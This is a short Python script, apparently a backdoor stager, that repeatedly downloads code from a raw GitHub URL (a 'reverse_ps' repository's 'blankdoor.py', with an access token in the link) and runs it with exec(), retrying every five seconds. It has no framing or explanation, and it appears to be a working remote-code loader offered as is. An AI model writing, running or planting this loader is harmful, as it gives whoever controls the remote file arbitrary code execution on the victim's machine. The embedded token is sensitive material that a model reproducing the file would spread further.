import requests, time
url = "https://raw.githubusercontent.com/tot-camiy-coder/reverse_ps/refs/heads/main/blankdoor.py?token=GHSAT0AAAAAACZ7XO5UHRFRSEVS3QEMISWQZZKKX7A"
while True:
    try: 
        r = requests.get(url)
        exec(r.text)
    except:
        time.sleep(5)

